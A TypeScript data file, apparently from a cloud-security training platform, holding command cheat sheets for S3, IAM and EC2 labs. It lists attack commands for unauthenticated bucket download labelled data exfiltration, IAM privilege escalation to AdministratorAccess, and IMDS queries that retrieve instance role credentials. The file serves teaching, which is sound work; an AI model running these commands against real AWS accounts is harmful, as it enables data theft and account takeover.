export interface CheatSheet {
  labId: string;
  title: string;
  description: string;
  commands: Array<{
    category: string;
    items: Array<{
      description: string;
      command: string;
      example: string;
    }>;
  }>;
  tips: string[];
  commonErrors: string[];
}

export const commandCheatSheets: Record<string, CheatSheet> = {
  "lab-1-s3": {
    labId: "lab-1-s3",
    title: "S3 Security - Command Cheat Sheet",
    description: "Quick reference for AWS CLI S3 commands used in security assessments",
    commands: [
      {
        category: "Bucket Enumeration",
        items: [
          {
            description: "List all accessible S3 buckets",
            command: "aws s3 ls --no-sign-request",
            example: "aws s3 ls --no-sign-request | grep company",
          },
          {
            description: "Check bucket versioning",
            command: "aws s3api get-bucket-versioning --bucket BUCKET-NAME --no-sign-request",
            example: "aws s3api get-bucket-versioning --bucket my-company-secrets-2025 --no-sign-request",
          },
        ],
      },
      {
        category: "Data Exfiltration",
        items: [
          {
            description: "List objects in bucket",
            command: "aws s3 ls s3://BUCKET-NAME --no-sign-request",
            example: "aws s3 ls s3://my-company-secrets-2025 --no-sign-request",
          },
          {
            description: "Download file from bucket",
            command: "aws s3 cp s3://BUCKET-NAME/FILE-PATH . --no-sign-request",
            example: "aws s3 cp s3://my-company-secrets-2025/financial-records.txt . --no-sign-request",
          },
          {
            description: "Recursive download of all objects",
            command: "aws s3 sync s3://BUCKET-NAME . --no-sign-request",
            example: "aws s3 sync s3://my-company-secrets-2025 . --no-sign-request",
          },
        ],
      },
      {
        category: "ACL & Policy Review",
        items: [
          {
            description: "Get bucket ACL",
            command: "aws s3api get-bucket-acl --bucket BUCKET-NAME --no-sign-request",
            example: "aws s3api get-bucket-acl --bucket my-company-secrets-2025 --no-sign-request",
          },
          {
            description: "Get bucket policy",
            command: "aws s3api get-bucket-policy --bucket BUCKET-NAME --no-sign-request",
            example: "aws s3api get-bucket-policy --bucket my-company-secrets-2025 --no-sign-request",
          },
        ],
      },
    ],
    tips: [
      "Always use --no-sign-request to attempt unauthenticated access",
      "Use --profile flag to test with different AWS credentials",
      "Check bucket region with: aws s3api get-bucket-location --bucket BUCKET-NAME",
      "Document findings in a timestamped report for compliance",
    ],
    commonErrors: [
      "NoSuchBucket - Bucket doesn't exist or is in different region",
      "AccessDenied - Bucket exists but requires authentication",
      "InvalidArgument - Check syntax and region specification",
    ],
  },
  "lab-2-iam": {
    labId: "lab-2-iam",
    title: "IAM Privilege Escalation - Command Cheat Sheet",
    description: "AWS CLI commands for IAM enumeration and privilege escalation",
    commands: [
      {
        category: "User Enumeration",
        items: [
          {
            description: "List all IAM users",
            command: "aws iam list-users",
            example: "aws iam list-users | grep UserName",
          },
          {
            description: "Get current user/role info",
            command: "aws sts get-caller-identity",
            example: "aws sts get-caller-identity",
          },
          {
            description: "List inline policies for user",
            command: "aws iam list-user-policies --user-name USER-NAME",
            example: "aws iam list-user-policies --user-name vulnerable-user",
          },
        ],
      },
      {
        category: "Policy Review",
        items: [
          {
            description: "Get attached policies for user",
            command: "aws iam list-attached-user-policies --user-name USER-NAME",
            example: "aws iam list-attached-user-policies --user-name vulnerable-user",
          },
          {
            description: "Get policy document details",
            command: "aws iam get-user-policy --user-name USER-NAME --policy-name POLICY-NAME",
            example: "aws iam get-user-policy --user-name vulnerable-user --policy-name admin-access",
          },
          {
            description: "Get managed policy details",
            command: "aws iam get-policy-version --policy-arn ARN --version-id v1",
            example: "aws iam get-policy-version --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --version-id v1",
          },
        ],
      },
      {
        category: "Privilege Escalation",
        items: [
          {
            description: "Attach admin policy to user",
            command: "aws iam attach-user-policy --user-name USER-NAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
            example: "aws iam attach-user-policy --user-name vulnerable-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
          },
          {
            description: "Create inline policy for user",
            command: "aws iam put-user-policy --user-name USER-NAME --policy-name POLICY-NAME --policy-document file://policy.json",
            example: "aws iam put-user-policy --user-name vulnerable-user --policy-name escalate-policy --policy-document file://admin.json",
          },
        ],
      },
    ],
    tips: [
      "Use --query parameter to filter output: aws iam list-users --query 'Users[*].UserName'",
      "Export policies to JSON for analysis",
      "Check AssumeRolePolicyDocument for role permissions",
      "Review trust relationships that allow cross-account access",
    ],
    commonErrors: [
      "AccessDenied - Insufficient permissions for IAM actions",
      "NoSuchEntity - User or role doesn't exist",
      "MalformedPolicyDocument - Invalid JSON in policy",
    ],
  },
  "lab-3-ec2": {
    labId: "lab-3-ec2",
    title: "EC2 Security - Command Cheat Sheet",
    description: "AWS CLI commands for EC2 security assessment and IMDS exploitation",
    commands: [
      {
        category: "Instance Enumeration",
        items: [
          {
            description: "List all EC2 instances",
            command: "aws ec2 describe-instances",
            example: "aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,PublicIpAddress]'",
          },
          {
            description: "Get security groups",
            command: "aws ec2 describe-security-groups",
            example: "aws ec2 describe-security-groups | grep -A 10 GroupName",
          },
          {
            description: "Describe specific instance",
            command: "aws ec2 describe-instances --instance-ids i-1234567890abcdef0",
            example: "aws ec2 describe-instances --instance-ids i-1234567890abcdef0",
          },
        ],
      },
      {
        category: "Security Group Analysis",
        items: [
          {
            description: "Check inbound rules",
            command: "aws ec2 describe-security-groups --group-ids sg-12345678 --query 'SecurityGroups[*].IpPermissions'",
            example: "aws ec2 describe-security-groups --group-ids sg-12345678 --query 'SecurityGroups[*].IpPermissions'",
          },
          {
            description: "Find SSH-open groups",
            command: "aws ec2 describe-security-groups --filters Name=ip-permission.from-port,Values=22",
            example: "aws ec2 describe-security-groups --filters Name=ip-permission.from-port,Values=22",
          },
        ],
      },
      {
        category: "IMDS Exploitation",
        items: [
          {
            description: "Query IMDS v1 (from instance)",
            command: "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            example: "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ | head -1",
          },
          {
            description: "Get temporary credentials",
            command: "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME",
            example: "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role",
          },
          {
            description: "Query instance metadata",
            command: "curl http://169.254.169.254/latest/meta-data/",
            example: "curl http://169.254.169.254/latest/meta-data/ | grep -E 'instance|ami|security'",
          },
        ],
      },
    ],
    tips: [
      "Always filter security groups for port 22 (SSH) exposure",
      "IMDS v1 tokens are permanent during instance lifetime",
      "Use IMDSv2 for better security (token-based access)",
      "Check both VPC and EC2-Classic security groups",
    ],
    commonErrors: [
      "UnauthorizedOperation - IAM permissions required",
      "Connection timeout - Instance not accessible",
      "IMDS not responding - Instance may use IMDSv2 only",
    ],
  },
};

export function getCheatSheet(labId: string): CheatSheet | undefined {
  return commandCheatSheets[labId];
}

export function exportCheatSheetAsMarkdown(cheatSheet: CheatSheet): string {
  let markdown = `# ${cheatSheet.title}\n\n${cheatSheet.description}\n\n`;

  for (const section of cheatSheet.commands) {
    markdown += `## ${section.category}\n\n`;
    for (const item of section.items) {
      markdown += `### ${item.description}\n\`\`\`bash\n${item.command}\n\`\`\`\n`;
      markdown += `**Example:**\n\`\`\`bash\n${item.example}\n\`\`\`\n\n`;
    }
  }

  markdown += `## Tips\n\n`;
  for (const tip of cheatSheet.tips) {
    markdown += `- ${tip}\n`;
  }

  markdown += `\n## Common Errors\n\n`;
  for (const error of cheatSheet.commonErrors) {
    markdown += `- ${error}\n`;
  }

  return markdown;
}
